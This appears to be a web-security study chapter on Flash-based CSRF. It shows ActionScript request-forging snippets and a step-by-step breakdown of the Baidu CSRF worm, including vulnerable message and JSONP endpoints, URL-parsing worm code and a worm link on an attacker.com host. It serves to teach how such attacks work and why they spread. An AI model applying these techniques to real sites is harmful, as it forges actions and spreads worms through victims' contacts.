# 26 - Flash CSRF, Custom Headers, and Baidu Worm Case Study

## Flash-Based CSRF

Flash (ActionScript) could send cross-origin HTTP requests, making it a powerful CSRF tool before it was deprecated.

### ActionScript 3 — POST Request

```actionscript
import flash.net.URLRequest;
import flash.system.Security;

var url = new URLRequest("http://target/page");
var param = new URLVariables();
param = "test=123";
url.method = "POST";
url.data = param;
sendToURL(url);
stop();
```

Flash sends a POST request to `target/page` with the victim's cookies. Unlike HTML forms, Flash could target any URL without the restrictions of same-origin policy (depending on `crossdomain.xml` configuration).

### ActionScript 2 — Custom Headers via LoadVars

```actionscript
req = new LoadVars();
req.addRequestHeader("foo", "bar");
req.send("http://target/page?v1=123&v2=456", "_blank", "GET");
```

Flash could add **custom HTTP headers** to requests — something HTML forms and `<img>` tags cannot do. This bypassed CSRF defenses that relied on checking for custom headers (e.g., `X-Requested-With`) since the attacker could forge them.

## Case Study: Baidu CSRF Worm

### The Vulnerable Endpoints

Baidu exposed user actions as simple GET requests with no CSRF tokens:

**Send a message:**
```
http://msg.baidu.com/?ct=22&cm=MailSend&tn=bmSubmit&sn=用户账户&co=消息内容
```

**Get a user's friend list:**
```
http://frd.baidu.com/?ct=28&un=用户账户&cm=FriList&tn=bmABCFriList&callback=gotfriends
```

The `callback=gotfriends` parameter indicates a **JSONP endpoint** — it returns the friend list wrapped in a function call, readable cross-origin.

### The Worm Logic — Code Breakdown

**Step 1: Parse the current URL to extract the victim's username**

```javascript
var lsURL = window.location.href;
loU = lsURL.split("?");
if (loU.length > 1)
{
  var loallPm = loU[1].split("&");
  ……
```

The worm page URL looks something like:

```
http://attacker.com/worm.html?un=victimName
```

This code splits the URL at `?` to get the query string, then splits on `&` to extract individual parameters. The worm needs the current victim's username (`un`) to know whose friend list to fetch.

**Why parse the URL?** The worm is a single static page. When it spreads to a new victim, it passes the new victim's username as a URL parameter. Each time the page loads, it reads the username from its own URL to know who to target.

**Step 2: Fetch the victim's friend list via JSONP**

```
http://frd.baidu.com/?ct=28&un=受害者账户&cm=FriList&tn=bmABCFriList&callback=gotfriends
```

The worm injects a `<script>` tag pointing to this URL. Baidu returns:

```javascript
gotfriends(["friend1", "friend2", "friend3", ...])
```

The worm defines a `gotfriends()` function beforehand to capture the data. Since JSONP wraps the response in a callback, the friend list is now available to the attacker's JavaScript — **this is the "read" capability that makes the worm self-propagating**.

**Step 3: Send the worm link to every friend**

For each friend in the list, the worm triggers a request to:

```
http://msg.baidu.com/?ct=22&cm=MailSend&tn=bmSubmit&sn=好友账户&co=点击这个链接...
```

The `co` (content) parameter contains the worm URL with the **next victim's username** embedded:

```
http://attacker.com/worm.html?un=好友账户
```

This can be done by injecting `<img>` tags or iframes — the browser fires the GET request with the victim's cookies, and Baidu sends the message.

**Step 4: Each friend clicks the link → the cycle repeats**

```
Victim A opens worm page
  → reads A's friends [B, C, D]
  → sends worm link to B, C, D
    → B opens worm page
      → reads B's friends [E, F]
      → sends worm link to E, F
        → exponential spread
```

### The Three Components That Make a Worm

| Component | How | Code Role |
|-----------|-----|-----------|
| **Read data** | JSONP friend list endpoint | Get list of targets to spread to |
| **Write action** | GET-based mail send endpoint | Deliver the worm payload to each target |
| **Self-replication** | URL parameter passing + URL parsing | Each new victim page knows who to target next |

Without any one of these three, the worm breaks. Remove the JSONP read → the attacker can't find targets. Remove the mail CSRF → the worm can't spread. Remove the URL parsing → the worm can't adapt to each new victim.

### Why It Spread

- **GET-based state changes** — sending messages and reading data used simple GET URLs
- **No CSRF tokens** — the server blindly trusted any request with a valid session cookie
- **JSONP for data exfiltration** — the `callback` parameter let the attacker read the friend list cross-origin, turning a blind CSRF into a **data-reading worm**
- **Self-propagating** — the message content included the worm URL, creating exponential spread

### CSRF vs CSRF Worm

| | Simple CSRF | CSRF Worm |
|---|------------|-----------|
| **Action** | Single forged request | Reads data + forges requests |
| **Spread** | One victim at a time | Self-propagating via victim's contacts |
| **Data access** | Blind (can't read response) | Reads data via JSONP/Flash |
| **Impact** | One user affected | Entire user base at risk |

The combination of **CSRF (write)** + **JSONP (read)** is what turns a simple CSRF into a worm — the attacker can read the victim's contacts and spread the attack automatically.
